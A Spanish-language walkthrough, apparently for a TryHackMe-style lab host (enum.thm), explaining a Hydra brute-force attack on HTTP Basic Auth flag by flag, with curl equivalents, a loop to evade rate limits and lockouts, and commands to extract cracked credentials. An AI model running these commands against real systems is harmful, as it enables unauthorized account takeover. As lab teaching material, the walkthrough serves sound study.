╼ $hydra -l admin -P ~/Downloads/pass.txt enum.thm http-get /labs/basic_auth/ -t 8 -f -V -o ~/hydra_basic_auth_hits.txt

Bloque 1 — Comando completo (tu línea)

```
hydra -l admin -P ~/Downloads/pass.txt enum.thm http-get /labs/basic_auth/ -t 8 -f -V -o ~/hydra_basic_auth_hits.txt
```

Bloque 2 — Desglose exacto (flag → función)

```
hydra                 # herramienta de fuerza bruta
-l admin              # usuario fijo: "admin"
-P ~/Downloads/pass.txt  # fichero con listas de contraseñas (una por línea)
enum.thm              # objetivo (host) que Hydra resolverá a IP
http-get /labs/basic_auth/  # módulo http-get + ruta objetivo (genera header Authorization)
-t 8                  # número de tareas/threads concurrentes (máx. intentos paralelos)
-f                    # salir al primer credencial válida encontrada
-V                    # verbose: muestra cada intento y respuesta HTTP en stdout
-o ~/hydra_basic_auth_hits.txt  # volcar resultados (hits) a fichero
```

Bloque 3 — Cómo Hydra hace Basic Auth (lo que sucede en la red)

```
1) Para cada intento Hydra toma "admin:PASS".
2) Codifica "admin:PASS" en base64.
3) Envía petición HTTP con header:
   Authorization: Basic <base64(admin:PASS)>
   y solicita la ruta indicada: GET /labs/basic_auth/ HTTP/1.1
4) Interpreta el código HTTP devuelto; un 200 (OK) se considera éxito para este módulo.
```

Bloque 4 — Qué ver en -V (qué buscar en la salida)

```
- Líneas por intento mostrando STATUS/HTTP_CODE.
- Mensaje final tipo: [80][http-get] host: enum.thm   login: admin   password: SECRET
- Si ves 401 repetidos → credenciales rechazadas.
- Si ves 302/301 → redirección; Hydra puede seguir sin detectar éxito (usar http-head o curl para confirmar).
- Si ves 429 o bloqueos → rate-limit; reduce -t o usa split+pausas.
```

Bloque 5 — Comprobaciones rápidas si algo falla

```
# Probar exactamente la cabecera que Hydra envía (reproduce un intento)
curl -I -s -H "Authorization: Basic $(echo -n 'admin:PASS' | base64)" "http://enum.thm/labs/basic_auth/"

# Probar sin trailing slash (a veces cambia respuesta)
hydra -l admin -P ~/Downloads/pass.txt enum.thm http-get /labs/basic_auth -t 4 -f -V

# Usar http-head si sólo interesa código y minimizar cuerpo
hydra -l admin -P ~/Downloads/pass.txt enum.thm http-head /labs/basic_auth/ -t 4 -f -V
```

Bloque 6 — Manejo de carga / evitar bloqueo

```
- Reducir concurrencia: -t 2..8 según tolerancia.
- Dividir wordlist y añadir pausas:
  split -l 10000 ~/Downloads/pass.txt chunk_
  for f in chunk_*; do
    hydra -l admin -P "$f" enum.thm http-get /labs/basic_auth/ -t 4 -f -V -o hits_"$f".txt
    sleep 10
  done
- O usar un loop curl con sleep si Hydra choca contra protecciones:
  while read -r p; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Basic $(echo -n "admin:$p"|base64)" "http://enum.thm/labs/basic_auth/")
    [ "$code" = "200" ] && echo "FOUND: admin:$p" && break
    sleep 0.5
  done < ~/Downloads/pass.txt
```

Bloque 7 — Formato de salida y extracción automatizada

```
# ejemplo de línea de Hydra:
# [80][http-get] host: enum.thm   login: admin   password: PASSWORD

# extraer user:pass
grep -Eo 'login: [^ ]+ +password: .+' ~/hydra_basic_auth_hits.txt | sed 's/login: //;s/  password: /:/'
```

Bloque 8 — Limitaciones y notas técnicas

```
- Hydra detecta éxito según comportamiento esperado por el módulo: para http-get normalmente 200. Si la aplicación devuelve 200 también en fallo (página de login con 200), Hydra tendrá falsos positivos/negativos.
- Redirecciones, cookies, JavaScript y HTML dinámico pueden invalidar detecciones simples; en esos casos reproducir intentos con curl o Burp es más fiable.
- No hay resume nativo fiable para módulos http; usa split/offset para reanudar.
- Ajusta Host/Host: header si trabajas con nombre virtual (Hydra usa el host que le pasas; si hay conflicto, usa curl-loop).
```

Fin.
